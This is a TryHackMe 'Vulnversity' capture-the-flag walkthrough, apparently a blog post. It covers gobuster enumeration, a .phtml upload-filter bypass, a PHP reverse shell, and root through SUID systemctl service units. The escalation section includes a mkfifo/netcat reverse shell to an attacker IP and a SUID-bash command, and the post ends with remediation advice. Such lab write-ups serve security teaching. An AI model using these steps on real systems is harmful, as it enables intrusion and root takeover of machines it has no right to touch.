---
title: "TryHackMe: Vulnversity — Directory Bruteforce, File Upload Extension Filter Bypass & systemctl SUID PrivEsc"
author: parthpandey
categories: [TryHackMe, Walkthroughs]
tags: [linux, gobuster, nmap, file-upload-bypass, phtml, burp-suite, suid, systemctl, privesc]
render_with_liquid: false
date: 2026-10-14 17:00:00 +0530
---

**Vulnversity** is an essential web application and Linux privilege escalation laboratory. It covers practical reconnaissance with **GoBuster**, analyzing server-side file upload filters to bypass flawed extension blacklists using `.phtml`, catching reverse shells, and weaponizing an atypical SUID permission on `/bin/systemctl` to spawn an unconstrained root environment.

---

## Room Metadata

| Attribute | Specification |
|:---|:---|
| **Platform** | TryHackMe |
| **Room URL** | [tryhackme.com/room/vulnversity](https://tryhackme.com/room/vulnversity) |
| **Target OS** | Linux (Ubuntu) |
| **Difficulty** | Easy |
| **Attack Vectors** | Directory Enumeration, Incomplete File Extension Blacklisting (`.phtml`), SUID Systemd Service Execution (`systemctl`) |
| **Key Utilities** | `nmap`, `gobuster`, `burpsuite`, `netcat`, `systemctl` |

---

## Attack Path Architecture

```
[Phase 1: Reconnaissance]
   │── Nmap scan reveals Apache web server on port 3333
   └── GoBuster directory discovery uncovers hidden endpoint: /internal/
         │
[Phase 2: Weaponized File Upload]
   │── /internal/ accepts file uploads with form validation
   │── Uploading .php -> "Extension not allowed"
   │── Burp Suite Intruder fuzzing extensions (.php, .php3, .php4, .php5, .phtml)
   │── Result: .phtml is accepted and executed by Apache
   └── Upload PentestMonkey PHP Reverse Shell as 'shell.phtml'
         │
[Phase 3: Ingress & User Access]
   │── Trigger execution by requesting: http://target:3333/internal/uploads/shell.phtml
   │── Netcat catches connection: www-data shell
   └── Extract user flag: /home/bill/user.txt
         │
[Phase 4: SUID Privilege Escalation]
   │── Enumerate SUID binaries: /bin/systemctl has SUID bit set!
   │── Create a custom systemd unit service file:
   │     [Service]
   │     Type=oneshot
   │     ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/flag"
   │── Register & enable unit via systemctl
   └── Read /tmp/flag ──> Complete Root Compromise (#)
```

---

## Phase 1: Reconnaissance & Discovery

Run an Nmap service scan across top ports:

```console
$ nmap -sC -sV -p- -T4 --min-rate 1000 -oN vulnversity_scan.txt 10.10.228.14
```

```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu
3128/tcp open  http-proxy  Squid http proxy 3.5.12
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Vuln University
```

Notice that the primary web application is hosted on port **3333**, not the standard port 80.

---

## Phase 2: Directory Bruteforcing with GoBuster

We brute-force the web directory structure on port 3333 using `gobuster`:

```console
$ gobuster dir -u http://10.10.228.14:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```

```
===============================================================
Gobuster v3.5
===============================================================
[+] Url:                     http://10.10.228.14:3333
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                directory-list-2.3-medium.txt
===============================================================
/images               (Status: 301) [Size: 320]
/css                  (Status: 301) [Size: 317]
/js                   (Status: 301) [Size: 316]
/internal             (Status: 301) [Size: 322]
===============================================================
```

The `/internal/` route hosts an administrative document upload form.

---

## Phase 3: Bypassing File Upload Filters

Attempting to upload a standard PHP reverse shell (`shell.php`) triggers a rejection:

> **"Extension not allowed"**

The application enforces a **blacklist filter** rather than an allowlist. To discover which alternative extensions are permitted, we capture the upload POST request in **Burp Suite** and send it to **Intruder**.

### Fuzzing Extension Blacklists
- Parameter: filename `shell.§ext§`
- Payload list:
  ```
  .php
  .php3
  .php4
  .php5
  .phtml
  ```

| Extension | Response Code | Response Body |
|:---|:---|:---|
| `.php` | 200 OK | Extension not allowed |
| `.php3` | 200 OK | Extension not allowed |
| `.php4` | 200 OK | Extension not allowed |
| `.php5` | 200 OK | Extension not allowed |
| **`.phtml`** | **200 OK** | **Success** |

The Apache web server is configured to parse `.phtml` files through the PHP engine!

### Gaining Initial Access
We rename the PHP reverse shell:

```console
$ cp /usr/share/webshells/php/php-reverse-shell.php ./shell.phtml
# (Configure IP to attacker 10.10.14.30 and port 4444)
```

Start Netcat listener:

```console
$ nc -lvnp 4444
```

Upload `shell.phtml` through the web form at `http://10.10.228.14:3333/internal/`, then navigate to `http://10.10.228.14:3333/internal/uploads/shell.phtml` to trigger execution:

```console
connect to [10.10.14.30] from (UNKNOWN) [10.10.228.14] 52402
Linux vulnversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 14:40:58 UTC 2019 x86_64
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ cat /home/bill/user.txt
a58ff8...[REDACTED USER FLAG]
```

---

## Phase 4: Local Privilege Escalation via SUID `systemctl`

Search for binaries with SUID bits set:

```console
$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newgrp
/bin/systemctl
/bin/su
/bin/ping
```

Notice: **`/bin/systemctl` has the SUID bit set (`-rwsr-xr-x`)**.

### How SUID `systemctl` Can Be Abused
`systemctl` manages Linux system services. Because it runs as `root`, we can construct a custom `.service` unit that executes arbitrary commands when started by `systemctl`.

### Step 1: Craft the Service Unit

In our shell, we write a temporary unit file using a bash variable:

```console
$ PRIV_SERVICE=$(mktemp).service
$ echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $PRIV_SERVICE
```

*(Note: We can also directly copy the root flag or spawn a root reverse shell)*:

```console
$ echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/root_flag.txt && chmod 777 /tmp/root_flag.txt"
[Install]
WantedBy=multi-user.target' > $PRIV_SERVICE
```

### Step 2: Link & Run the Unit

```console
$ /bin/systemctl link $PRIV_SERVICE
Created symlink from /etc/systemd/system/tmp.jF8q2Z.service to /tmp/tmp.jF8q2Z.service.

$ /bin/systemctl enable --now $PRIV_SERVICE
Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.jF8q2Z.service to /tmp/tmp.jF8q2Z.service.
```

### Step 3: Retrieve Root Flag

```console
$ cat /tmp/root_flag.txt
a578ac...[REDACTED ROOT FLAG]
```

To spawn an interactive root shell, we can also execute:

```console
$ /bin/systemctl link $(echo '[Service]
Type=oneshot
ExecStart=/bin/bash -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.30 5555 >/tmp/f"
[Install]
WantedBy=multi-user.target' > /tmp/root.service)
$ /bin/systemctl enable --now /tmp/root.service
```

Catch root shell on listener:

```console
# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## Remediation & Hardening Recommendations

1. **File Upload Validation**:
   - Replace blacklists with strict **allowlists** (e.g., only `.png`, `.jpg`, `.pdf`).
   - Store uploaded files outside the web root (`DocumentRoot`) or disable script execution within the upload directory in Apache:
     ```apache
     <Directory "/var/www/html/internal/uploads">
         php_admin_flag engine off
         Options -ExecCGI
     </Directory>
     ```
   - Randomize stored filenames on disk (e.g. `uuid4()`) and verify MIME types using magic bytes (`file -b --mime-type`).

2. **SUID Permissions**:
   - Strip unnecessary SUID permissions from administrative binaries:
     ```console
     # chmod u-s /bin/systemctl
     ```

